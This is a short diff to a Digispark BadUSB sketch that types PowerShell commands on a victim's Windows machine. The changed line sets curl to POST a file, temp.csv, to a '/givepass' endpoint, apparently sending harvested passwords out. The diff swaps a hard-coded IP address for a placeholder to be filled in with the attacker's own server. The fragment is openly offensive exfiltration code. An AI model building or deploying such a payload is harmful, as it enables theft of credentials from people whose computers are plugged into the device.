@@ -16,7 +16,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
 // this is the curl arguments
-  DigiKeyboard.print("$CurlArgument = '-X', 'POST', '-d', '@temp.csv', 'http://220.245.150.140:443/givepass'");
+  DigiKeyboard.print("$CurlArgument = '-X', 'POST', '-d', '@temp.csv', 'http://$Your-IP-Here$/givepass'");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 // curl is installed on all win 10 in system32 which is pretty cool but powershell doesn't have it on path for some reason so this is needed
   DigiKeyboard.print("$CurlEXE = 'C:/Windows/System32/curl.exe'");
